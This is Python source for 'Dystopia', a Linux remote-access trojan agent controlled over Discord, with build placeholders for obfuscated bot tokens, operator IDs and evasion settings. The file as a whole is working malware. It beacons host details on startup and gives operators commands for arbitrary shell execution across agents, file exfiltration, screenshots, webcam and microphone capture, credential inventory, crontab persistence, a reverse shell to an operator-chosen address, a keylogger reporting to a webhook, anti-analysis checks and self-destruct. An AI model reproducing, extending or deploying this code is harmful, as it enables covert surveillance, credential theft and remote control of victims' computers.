# -*- coding: utf-8 -*-
"""Dystopia Discord agent — Linux target.

Placeholders replaced by builder / build_api:
  {GUILD_EXPR} {CHANNEL_EXPR} {WEBHOOK_EXPR} {TOKEN_EXPR}
  {EVASION} {OPERATOR_IDS}
  When obfuscate=true (default), *_EXPR values call secretbox.unlock(...).
"""

from __future__ import annotations

import os
import sys
import tempfile
from datetime import datetime

import discord
from discord import app_commands
from discord.ext import commands

from libraries import linuxops as ops
from libraries import keylogger_linux as keylogger
from libraries import secretbox
import threading

GUILD = discord.Object(id={GUILD_EXPR})
CHANNEL = {CHANNEL_EXPR}
KEYLOGGER_WEBHOOK = {WEBHOOK_EXPR}
EVASION = {EVASION}
CURRENT_AGENT = 0
ID = 0
MSG = "Agent Online"
COLOR = 0x00FF00

OPERATOR_IDS = {OPERATOR_IDS}  # replaced at build time with a set of ints


def _authorized(user_id: int) -> bool:
    return int(user_id) in OPERATOR_IDS


async def _deny_interaction(interaction: discord.Interaction) -> None:
    embed = discord.Embed(title="Unauthorized", color=0xFF0000)
    if interaction.response.is_done():
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message(embed=embed, ephemeral=True)


class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
        self.channel = self.get_channel(CHANNEL) or await self.fetch_channel(CHANNEL)
        now = datetime.now()
        embed = discord.Embed(
            title=f"{MSG}",
            description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**",
            color=COLOR,
        )
        embed.add_field(name="**IP**", value=ops.getIP(), inline=True)
        embed.add_field(name="**Bits**", value=ops.getBits(), inline=True)
        embed.add_field(name="**HostName**", value=ops.getHostname(), inline=True)
        embed.add_field(name="**OS**", value=ops.getOS(), inline=True)
        embed.add_field(name="**Username**", value=ops.getUsername(), inline=True)
        embed.add_field(name="**CPU**", value=ops.getCPU(), inline=False)
        embed.add_field(name="**Is Admin**", value=ops.isAdmin(), inline=True)
        embed.add_field(name="**Is VM**", value=ops.isVM(), inline=True)
        embed.add_field(name="**Platform**", value="linux", inline=True)
        if self.channel:
            await self.channel.send(embed=embed)

    async def setup_hook(self):
        await self.tree.sync(guild=GUILD)

    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            embed = discord.Embed(title="Unauthorized", color=0xFF0000)
            if ctx.interaction and not ctx.interaction.response.is_done():
                await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                await ctx.reply(embed=embed)
            return
        await ctx.reply(embed=discord.Embed(title=f"**Error:** {error}", color=0xFF0000))


class InteractButton(discord.ui.View):
    def __init__(self, inv: str, agent_id: int):
        super().__init__()
        self.inv = inv
        self.id = agent_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if _authorized(interaction.user.id):
            return True
        await _deny_interaction(interaction)
        return False

    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(
            embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00),
            ephemeral=True,
        )

    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            embed=discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
        )
        await bot.close()
        sys.exit(0)

    @discord.ui.button(label="Webshot", style=discord.ButtonStyle.gray, emoji="📸")
    async def webshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.webshot()
        if result:
            await interaction.response.send_message(file=discord.File(result))
            try:
                os.remove(result)
            except Exception:
                pass
        else:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title=f"Webshot N/A on this Linux agent (no webcam/OpenCV)",
                    color=0xFFAA00,
                )
            )

    @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.process()
        path = ops.tmp_path("process.txt")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(result)
        await interaction.response.send_message(file=discord.File(path))
        os.remove(path)

    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.screenshot()
        if result:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            await interaction.response.send_message(
                embed=discord.Embed(title="Screenshot unavailable (headless/no GUI)", color=0xFF0000)
            )

    @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.creds()
        if result:
            await interaction.response.send_message(
                content="Linux best-effort cred inventory (Windows-only decrypt limited)",
                file=discord.File(result),
            )
            try:
                os.remove(result)
            except Exception:
                pass
        else:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title=f"Creds unavailable on Agent#{self.id} (Windows-only / limited)",
                    color=0xFFAA00,
                )
            )

    @discord.ui.button(label="Persistent", style=discord.ButtonStyle.gray, emoji="🔁")
    async def persistent(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.persistent()
        ok = result is True or result == "already-enabled"
        title = f"Persistence on Agent#{self.id}: {result}"
        await interaction.response.send_message(
            embed=discord.Embed(title=title, color=0x00FF00 if ok else 0xFF0000)
        )

    @discord.ui.button(label="Location", style=discord.ButtonStyle.gray, emoji="🌐")
    async def location(self, interaction: discord.Interaction, button: discord.ui.Button):
        response = ops.location()
        if response is False:
            await interaction.response.send_message(
                embed=discord.Embed(title=f"Error while getting location of Agent#{self.id}", color=0xFF0000)
            )
            return
        data = response.json()
        embed = discord.Embed(title=f"IP Based Location on Agent#{self.id}", color=0x00FF00)
        embed.add_field(name="IP:", value=f"**{data.get('YourFuckingIPAddress')}**", inline=False)
        embed.add_field(name="Hostname:", value=f"**{data.get('YourFuckingHostname')}**", inline=False)
        embed.add_field(name="City:", value=f"**{data.get('YourFuckingLocation')}**", inline=False)
        embed.add_field(name="Country:", value=f"**{data.get('YourFuckingCountryCode')}**", inline=False)
        embed.add_field(name="ISP:", value=f"**{data.get('YourFuckingISP')}**", inline=False)
        await interaction.response.send_message(embed=embed)

    @discord.ui.button(label="Selfdestruct", style=discord.ButtonStyle.red, emoji="💣")
    async def selfdestruct(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = ops.selfdestruct()
        await interaction.response.send_message(
            embed=discord.Embed(
                title=f"Agent#{self.id} deleted" if result is True else f"Error: {result}",
                color=0x00FF00 if result is True else 0xFF0000,
            )
        )
        if result is True:
            await bot.close()
            sys.exit(0)


bot = Bot()


@bot.check
async def _ops_only(ctx: commands.Context):
    if _authorized(ctx.author.id):
        return True
    raise commands.CheckFailure("Unauthorized")



def _active() -> bool:
    return int(CURRENT_AGENT) == int(ID)


async def _send_text(ctx: commands.Context, result: str, limit: int = 1900):
    if len(result) > limit:
        path = ops.tmp_path("response.txt")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"```\n{result}\n```")


@bot.hybrid_command(name="interact", with_app_command=True, description="Interact with an agent")
@app_commands.guilds(GUILD)
async def interact_cmd(ctx: commands.Context, id: int):
    global CURRENT_AGENT
    CURRENT_AGENT = id
    await ctx.reply(embed=discord.Embed(title=f"Interacting with Agent#{id}", color=0x00FF00))


@bot.hybrid_command(name="background", with_app_command=True, description="Background an agent")
@app_commands.guilds(GUILD)
async def background_cmd(ctx: commands.Context):
    global CURRENT_AGENT
    CURRENT_AGENT = 0
    await ctx.reply(embed=discord.Embed(title="Background Agent", color=0x00FF00))


@bot.hybrid_command(name="cmd", with_app_command=True, description="Run any command on the target machine")
@app_commands.guilds(GUILD)
async def cmd_cmd(ctx: commands.Context, command: str):
    if _active():
        await _send_text(ctx, ops.cmd(command))
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="cmd-all", with_app_command=True, description="Run command on all online agents")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command: str):
    await _send_text(ctx, ops.cmd(command))


@bot.hybrid_command(name="cd", with_app_command=True, description="Change directory on the target")
@app_commands.guilds(GUILD)
async def cd_cmd(ctx: commands.Context, path: str):
    if _active():
        result = ops.cd(path)
        if result is True:
            embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
        else:
            embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)
        await ctx.reply(embed=embed)
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="process", with_app_command=True, description="List processes")
@app_commands.guilds(GUILD)
async def process_cmd(ctx: commands.Context):
    if _active():
        await _send_text(ctx, ops.process(), limit=3500)
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="upload", with_app_command=True, description="Upload a file to the agent")
@app_commands.guilds(GUILD)
async def upload_cmd(ctx: commands.Context, url: str, name: str):
    if _active():
        result = ops.upload(url, name)
        ok = result is True
        await ctx.reply(
            embed=discord.Embed(
                title=(f"{name} uploaded to Agent#{ID}" if ok else f"Upload error: {result}"),
                color=0x00FF00 if ok else 0xFF0000,
            )
        )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="screenshot", with_app_command=True, description="Take a screenshot if GUI exists")
@app_commands.guilds(GUILD)
async def screenshot_cmd(ctx: commands.Context):
    if _active():
        result = ops.screenshot()
        if result:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            await ctx.reply(
                embed=discord.Embed(title=f"Screenshot unavailable on Agent#{ID}", color=0xFF0000)
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="persistent", with_app_command=True, description="Enable user-level persistence")
@app_commands.guilds(GUILD)
async def persistent_cmd(ctx: commands.Context):
    if _active():
        result = ops.persistent()
        ok = result is True or result == "already-enabled"
        await ctx.reply(
            embed=discord.Embed(title=f"Persistence on Agent#{ID}: {result}", color=0x00FF00 if ok else 0xFF0000)
        )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="ls", with_app_command=True, description="List online agents")
@app_commands.guilds(GUILD)
async def ls_cmd(ctx: commands.Context):
    if ctx.interaction:
        await ctx.reply(
            embed=discord.Embed(title="Please use **!ls** instead of the slash command", color=0xFF0000)
        )
        return
    embed = discord.Embed(title=f"Agent #{ID}   IP: {ops.getIP()}", color=0xADD8E6)
    embed.add_field(name="**OS**", value=ops.getOS(), inline=True)
    embed.add_field(name="**Username**", value=ops.getUsername(), inline=True)
    embed.add_field(name="**Platform**", value="linux", inline=True)
    await ctx.reply(embed=embed, view=InteractButton("Interact", ID))


@bot.hybrid_command(name="download", with_app_command=True, description="Download file from the target")
@app_commands.guilds(GUILD)
async def download_cmd(ctx: commands.Context, path: str):
    if _active():
        try:
            await ctx.reply(f"**Agent #{ID}** Requested File:", file=discord.File(path))
        except Exception as e:
            await ctx.reply(
                embed=discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="terminate", with_app_command=True, description="Terminate the agent process")
@app_commands.guilds(GUILD)
async def terminate_cmd(ctx: commands.Context):
    if _active():
        await ctx.reply(embed=discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00))
        await bot.close()
        sys.exit(0)
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="selfdestruct", with_app_command=True, description="Remove persistence and config")
@app_commands.guilds(GUILD)
async def selfdestruct_cmd(ctx: commands.Context):
    if _active():
        result = ops.selfdestruct()
        await ctx.reply(
            embed=discord.Embed(
                title=f"Agent#{ID} has been deleted" if result is True else f"Error: {result}",
                color=0x00FF00 if result is True else 0xFF0000,
            )
        )
        if result is True:
            await bot.close()
            sys.exit(0)
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="location", with_app_command=True, description="IP-based location")
@app_commands.guilds(GUILD)
async def location_cmd(ctx: commands.Context):
    if _active():
        response = ops.location()
        if response is False:
            await ctx.reply(
                embed=discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
            )
            return
        data = response.json()
        embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
        embed.add_field(name="IP:", value=f"**{data.get('YourFuckingIPAddress')}**", inline=False)
        embed.add_field(name="Hostname:", value=f"**{data.get('YourFuckingHostname')}**", inline=False)
        embed.add_field(name="City:", value=f"**{data.get('YourFuckingLocation')}**", inline=False)
        embed.add_field(name="Country:", value=f"**{data.get('YourFuckingCountryCode')}**", inline=False)
        embed.add_field(name="ISP:", value=f"**{data.get('YourFuckingISP')}**", inline=False)
        await ctx.reply(embed=embed)
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="revshell", with_app_command=True, description="Python reverse shell to ip:port")
@app_commands.guilds(GUILD)
async def revshell_cmd(ctx: commands.Context, ip: str, port: int):
    if _active():
        ops.revshell(ip, port)
        await ctx.reply(
            embed=discord.Embed(title=f"Attempting Reverse Shell on Agent#{ID}", color=0x00FF00)
        )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))




@bot.hybrid_command(name="webshot", with_app_command=True, description="Capture webcam photo on the target")
@app_commands.guilds(GUILD)
async def webshot_cmd(ctx: commands.Context):
    if _active():
        result = ops.webshot()
        if result:
            await ctx.reply(file=discord.File(result))
            try:
                os.remove(result)
            except Exception:
                pass
        else:
            await ctx.reply(
                embed=discord.Embed(
                    title="Not supported on Linux agent",
                    description="Webshot requires a webcam + OpenCV (cv2). N/A on this Linux agent.",
                    color=0xFFAA00,
                )
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))


@bot.hybrid_command(name="creds", with_app_command=True, description="Best-effort credential inventory on the target")
@app_commands.guilds(GUILD)
async def creds_cmd(ctx: commands.Context):
    if _active():
        result = ops.creds()
        if result:
            await ctx.reply(
                content="Linux best-effort cred inventory (Windows decrypt limited)",
                file=discord.File(result),
            )
            try:
                os.remove(result)
            except Exception:
                pass
        else:
            await ctx.reply(
                embed=discord.Embed(
                    title="Not supported on Linux agent",
                    description="Creds Windows-only / limited — no readable inventory produced.",
                    color=0xFFAA00,
                )
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))


@bot.hybrid_command(name="wallpaper", with_app_command=True, description="Change wallpaper (gsettings/feh if available)")
@app_commands.guilds(GUILD)
async def wallpaper_cmd(ctx: commands.Context, path_url: str):
    if _active():
        result = ops.wallpaper(path_url)
        if result is True:
            await ctx.reply(embed=discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00))
        elif result == "unsupported":
            await ctx.reply(
                embed=discord.Embed(
                    title="Not supported on Linux agent",
                    description="Need gsettings (GNOME) or feh on an X11 session.",
                    color=0xFFAA00,
                )
            )
        else:
            await ctx.reply(
                embed=discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))


@bot.hybrid_command(name="recordmic", with_app_command=True, description="Record microphone via arecord if available")
@app_commands.guilds(GUILD)
async def recordmic_cmd(ctx: commands.Context, seconds: int):
    if _active():
        result = ops.recordmic(seconds)
        if result:
            await ctx.reply(file=discord.File(result))
            try:
                os.remove(result)
            except Exception:
                pass
        else:
            await ctx.reply(
                embed=discord.Embed(
                    title="Not supported on Linux agent",
                    description="recordmic needs `arecord` (alsa-utils) and a capture device.",
                    color=0xFFAA00,
                )
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))


@bot.hybrid_command(name="killproc", with_app_command=True, description="Kill a process by PID")
@app_commands.guilds(GUILD)
async def killproc_cmd(ctx: commands.Context, pid: int):
    if _active():
        result = ops.killproc(pid)
        ok = result is True
        await ctx.reply(
            embed=discord.Embed(
                title=(f"Process {pid} killed on Agent#{ID}" if ok else f"Error killing {pid}: {result}"),
                color=0x00FF00 if ok else 0xFF0000,
            )
        )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))




@bot.hybrid_command(name="keylog", with_app_command=True, description="Start a keylogger on the target machine")
@app_commands.guilds(GUILD)
async def keylog_cmd(ctx: commands.Context, mode: str, interval: int):
    if _active():
        logger = keylogger.Keylogger(
            interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook"
        )
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
        else:
            ok, detail = logger.probe()
            if not ok:
                await ctx.reply(
                    embed=discord.Embed(
                        title=f"No input device found on Agent#{ID}",
                        description=detail,
                        color=0xFF0000,
                    )
                )
                return
            threading.Thread(target=logger.start, daemon=True).start()
            await ctx.reply(
                embed=discord.Embed(
                    title=f"Keylogger started on Agent#{ID}",
                    description=f"backend={detail}; interval={interval}s; webhook reports only",
                    color=0x00FF00,
                )
            )
    else:
        await ctx.reply(embed=discord.Embed(
            title=f"Not interacting with Agent#{ID}. Run /interact {ID} first (or !ls).",
            color=0xFF0000,
        ))



@bot.hybrid_command(name="help", with_app_command=True, description="Help menu")
@app_commands.guilds(GUILD)
async def help_cmd(ctx: commands.Context):
    embed = discord.Embed(title="Help Menu (Linux)", color=0x00FF00)
    embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
    embed.add_field(name="/background", value="Background current agent", inline=False)
    embed.add_field(name="/cmd <command>", value="Run shell command", inline=False)
    embed.add_field(name="/cmd-all <command>", value="Run on all agents sharing this bot", inline=False)
    embed.add_field(name="/cd <path>", value="Change directory", inline=False)
    embed.add_field(name="/process", value="List processes", inline=False)
    embed.add_field(name="/upload <url> <name>", value="Download URL onto agent", inline=False)
    embed.add_field(name="/download <path>", value="Exfil file from agent", inline=False)
    embed.add_field(name="/screenshot", value="GUI screenshot if available", inline=False)
    embed.add_field(name="/webshot", value="Webcam capture if OpenCV+cam available", inline=False)
    embed.add_field(name="/creds", value="Best-effort readable path inventory", inline=False)
    embed.add_field(name="/wallpaper <path|url>", value="gsettings/feh if available", inline=False)
    embed.add_field(name="/recordmic <seconds>", value="arecord WAV if available", inline=False)
    embed.add_field(name="/persistent", value="User crontab persistence", inline=False)
    embed.add_field(name="!ls", value="List active agents", inline=False)
    embed.add_field(name="/location", value="IP geolocation", inline=False)
    embed.add_field(name="/revshell <ip> <port>", value="Bash reverse shell", inline=False)
    embed.add_field(name="/killproc <pid>", value="Kill process", inline=False)
    embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop keylogger (webhook reports)\n/`keylog start 10`", inline=False)
    embed.add_field(name="/terminate", value="Stop agent process", inline=False)
    embed.add_field(name="/selfdestruct", value="Remove persistence + config", inline=False)
    await ctx.reply(embed=embed)


def _should_start() -> bool:
    # Linux: never hard-block on VM/VPS. Optional light analysis-tool check only.
    if not EVASION:
        return True
    return ops.light_evasion_ok()


if _should_start():
    first = ops.createConfig()
    ID = ops.id()
    if first:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00FF00
    else:
        MSG = f"Agent Online #{ID}"
        COLOR = 0x0000FF
    bot.run({TOKEN_EXPR})
else:
    sys.exit(0)
